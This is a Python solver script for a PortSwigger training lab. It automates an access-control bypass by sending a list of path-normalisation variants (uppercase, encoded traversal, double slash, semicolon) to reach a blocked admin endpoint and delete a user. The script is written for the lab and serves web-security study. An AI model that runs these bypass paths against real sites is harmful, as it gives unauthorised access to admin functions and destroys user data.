# Lab 05 — URL-based access control can be circumvented
# PortSwigger: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented
#
# Vulnerability: A front-end proxy blocks /admin/* by literal path matching,
#                but the backend app server interprets certain crafted paths
#                differently — letting the SAME resource be reached via a
#                path the proxy's rule doesn't recognise as /admin/*
# Aim:           Access /admin/deleteUser as a non-admin and delete carlos
#
# Technique:
#   Try a series of path variations that exploit normalisation differences
#   between the proxy layer and the backend: case changes, trailing path
#   segments, and encoded traversal sequences.
#
# Usage: python access_control_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 05 — URL-BASED ACCESS CONTROL BYPASS (PATH NORMALISATION)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm direct access is blocked ─────────────────────────────
    print("\n  ── Step 1: confirm direct /admin/deleteUser access is blocked\n")
    r_blocked = session.get(f"{url}/admin/deleteUser", params={"username": "carlos"})
    check_status(r_blocked, [401, 403, 404], "Direct /admin/deleteUser access")

    # ── Step 2: try a series of path-normalisation bypasses ──────────────────
    print("\n  ── Step 2: try path normalisation bypasses\n")

    bypass_paths = [
        "/ADMIN/deleteUser",
        "/admin/deleteUser/.",
        "/admin/deleteUser/..%2fdeleteUser",
        "/admin/deleteUser%2f..%2fdeleteUser",
        "//admin/deleteUser",
        "/admin/./deleteUser",
        "/admin;/deleteUser",
    ]

    success_path = None
    for path in bypass_paths:
        full_url = f"{url}{path}"
        r = session.get(full_url, params={"username": "carlos"})
        marker = "✔" if r.status_code == 200 else "✘"
        print(f"  {marker}  {path:45s} → {r.status_code}")
        if r.status_code == 200 and success_path is None:
            success_path = path

    if not success_path:
        print("\n  ✘  None of the standard bypasses worked — inspect the proxy")
        print("     configuration manually in Burp and try additional variations.")
        sys.exit(1)

    print(f"\n  ✔  Working bypass path: {success_path}\n")

    # ── Step 3: use the working path to delete carlos ────────────────────────
    print("  ── Step 3: delete carlos using the working bypass path\n")
    r_delete = session.get(f"{url}{success_path}", params={"username": "carlos"})
    check_status(r_delete, 200, "Delete carlos via bypass path")

    print()
    print("  ℹ  The proxy and backend disagreed on where the path 'ends' —")
    print("     exploiting that disagreement reached the same handler through")
    print("     a path the proxy's literal matching rule didn't recognise.")
